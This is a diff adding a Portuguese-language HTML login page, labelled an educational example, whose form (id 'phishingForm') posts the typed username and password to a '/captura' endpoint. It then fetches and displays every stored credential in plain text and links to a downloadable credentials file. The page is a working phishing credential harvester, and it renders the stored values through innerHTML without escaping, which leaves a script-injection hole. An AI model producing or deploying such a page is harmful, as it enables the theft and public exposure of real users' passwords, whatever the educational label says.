@@ -1,0 +1,68 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+  <meta charset="UTF-8">
+  <title>Login - Exemplo Educativo Global</title>
+  <style>
+    body { font-family: Arial, background: #f4f4f4; }
+    .container { max-width: 400px; margin: 50px auto; padding: 20px; background: #fff; border-radius: 6px; box-shadow: 0 2px 8px rgba(0,0,0,0.12);}
+    h2 { text-align: center; }
+    input[type="text"], input[type="password"] {
+      width: 100%; padding: 10px; margin: 8px 0; border: 1px solid #ccc; border-radius: 4px;
+    }
+    button {
+      width: 100%; padding: 10px; background: #007bff; color: #fff; border: none; border-radius: 4px; cursor: pointer;
+    }
+    button:hover { background: #0056b3; }
+    .saved-data { background: #eee; padding: 10px; margin-top: 20px; border-radius: 4px; font-size: 0.95em;}
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h2>Acesse sua conta</h2>
+    <form id="phishingForm">
+      <input type="text" id="usuario" placeholder="Usuário" required>
+      <input type="password" id="senha" placeholder="Senha" required>
+      <button type="submit">Entrar</button>
+    </form>
+    <div id="result"></div>
+    <div class="saved-data" id="savedData"></div>
+    <div style="margin-top:20px;">
+      <a href="/credenciais-arquivo" target="_blank">Baixar arquivo de credenciais salvas</a>
+    </div>
+  </div>
+  <script>
+    const form = document.getElementById('phishingForm');
+    const savedDataDiv = document.getElementById('savedData');
+
+    form.addEventListener('submit', function(e) {
+      e.preventDefault();
+      const usuario = document.getElementById('usuario').value;
+      const senha = document.getElementById('senha').value;
+
+      fetch("/captura", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ usuario, senha })
+      })
+      .then(res => res.json())
+      .then(data => {
+        document.getElementById('result').innerText = "Credenciais enviadas e salvas (exemplo educativo)!";
+        mostrarCredenciais();
+      });
+    });
+
+    function mostrarCredenciais() {
+      fetch("/credenciais")
+        .then(res => res.json())
+        .then(credenciais => {
+          savedDataDiv.innerHTML = "<b>Credenciais globais salvas:</b><br>" + credenciais.map(
+            (c, i) => `#${i+1} Usuário: <b>${c.usuario}</b> | Senha: <b>${c.senha}</b>`
+          ).join("<br>");
+        });
+    }
+
+    mostrarCredenciais();
+  </script>
+</body>
+</html>
